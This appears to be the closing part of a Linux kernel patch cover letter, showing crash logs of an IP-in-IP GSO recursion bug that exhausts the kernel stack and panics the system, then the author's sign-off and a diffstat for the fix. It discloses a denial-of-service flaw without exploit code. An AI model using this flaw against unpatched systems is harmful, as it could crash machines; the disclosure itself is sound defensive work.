[   11.336827] RIP: 0010:skb_copy_bits (net/core/skbuff.c:3061)
[   11.336869] Call Trace:
[   11.336882]  <TASK>
[   11.336884]  __pskb_pull_tail (net/core/skbuff.c:2892 (discriminator 2))
[   11.336885]  ? skb_copy_bits (net/core/skbuff.c:3061)
[   11.336886]  inet_gso_segment (include/linux/skbuff.h:2873 (discriminator 1) include/linux/skbuff.h:2882 (discriminator 1) net/ipv4/af_inet.c:1379 (discriminator 1))
[   11.336889]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   11.336891]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   11.336892]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   11.336893]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   11.336894]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   11.336896]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   11.336897]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   11.336898]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   11.336899]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   11.336901]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   11.336902]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   11.336903]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   11.337200] Kernel panic - not syncing: Fatal exception in interrupt

[BPF/veth, unpatched 88c17de85ddb]
[   18.344957] BUG: TASK stack guard page was hit at ffff9d2180bb3fe8 (stack is ffff9d2180bb4000..ffff9d2180bb8000)
[   18.344962] Oops: stack guard page: 0000 [#1] SMP NOPTI
[   18.344964] CPU: 1 UID: 0 PID: 433 Comm: poc Not tainted 7.2.0-rc4-g88c17de85ddb #1 PREEMPT(lazy) 
[   18.344966] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   18.344967] RIP: 0010:inet_gso_segment (net/ipv4/af_inet.c:1404 (discriminator 1))
[   18.345011] CR2: ffff9d2180bb3fe8 CR3: 000000000dcd8003 CR4: 0000000000370ef0
[   18.345012] Call Trace:
[   18.345035]  <TASK>
[   18.345036]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   18.345039]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   18.345040]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   18.345042]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   18.345043]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   18.345045]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   18.345047]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   18.345048]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   18.345050]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   18.345051]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   18.345053]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   18.345054]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   18.345056]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   18.345057]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   18.345059]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   18.345060]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   18.345281]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   18.345282]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   18.345284]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   18.345285]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   18.345287]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   18.345288]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   18.345290]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   18.345291]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   18.345293]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   18.345295]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   18.345296]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   18.345298]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   18.345299]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   18.345301]  inet_gso_segment (net/ipv4/af_inet.c:1411)
[   18.345302]  skb_mac_gso_segment (net/core/gso.c:53)
[   18.345305]  __skb_gso_segment (net/core/gso.c:124)
[   18.345306]  validate_xmit_skb.isra.0 (include/net/gso.h:83 net/core/dev.c:4044)
[   18.345309]  __dev_queue_xmit (net/core/dev.c:4865)
[   18.345312]  ip_finish_output2 (include/linux/netdevice.h:3446 include/net/neighbour.h:544 include/net/neighbour.h:558 net/ipv4/ip_output.c:236)
[   18.345315]  ip_output (net/ipv4/ip_output.c:443 net/ipv4/ip_output.c:324 include/linux/netfilter.h:307 net/ipv4/ip_output.c:437)
[   18.345317]  ? __pfx_ip_finish_output (include/net/dst.h:470 (discriminator 7))
[   18.345318]  iptunnel_xmit (net/ipv4/ip_tunnel_core.c:97)
[   18.345321]  ip_tunnel_xmit (net/ipv4/ip_tunnel.c:848)
[   18.345323]  ipip_tunnel_xmit (net/ipv4/ipip.c:316)
[   18.345325]  dev_hard_start_xmit (include/linux/netdevice.h:5400 include/linux/netdevice.h:5409 net/core/dev.c:3889 net/core/dev.c:3905)
[   18.345326]  ? validate_xmit_skb.isra.0 (net/core/dev.c:4067)
[   18.345328]  __dev_queue_xmit (net/core/dev.c:4878)
[   18.345375] Kernel panic - not syncing: Fatal exception in interrupt
[   18.346542] Kernel Offset: 0x38800000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
[   19.982144] ---[ end Kernel panic - not syncing: Fatal exception in interrupt ]---
-----END crash log-----

Best regards,
Zihan Xi

Zihan Xi (1):
  net: gso: limit recursive IP-in-IP segmentation

 include/net/gso.h      | 8 ++++++++
 net/ipv4/af_inet.c     | 2 ++
 net/ipv6/ip6_offload.c | 2 ++
 3 files changed, 12 insertions(+)

-- 
2.43.0

